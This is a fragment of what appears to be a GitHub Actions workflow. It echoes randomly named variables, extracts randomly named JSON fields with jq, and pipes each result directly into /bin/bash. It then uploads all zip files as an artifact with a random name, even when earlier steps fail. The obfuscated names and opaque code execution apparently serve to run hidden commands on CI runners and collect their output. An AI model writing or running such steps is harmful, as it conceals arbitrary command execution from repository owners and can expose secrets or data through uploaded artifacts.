          echo $aqkeh68 | jq -r .ccx50440 | /bin/bash
          echo $wxy70 | jq -r .fjbx7 | /bin/bash
          echo $ow19 | jq -r .fqki6 | /bin/bash

      - name: Save results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: TspZ4pkV
          path: "*.zip"
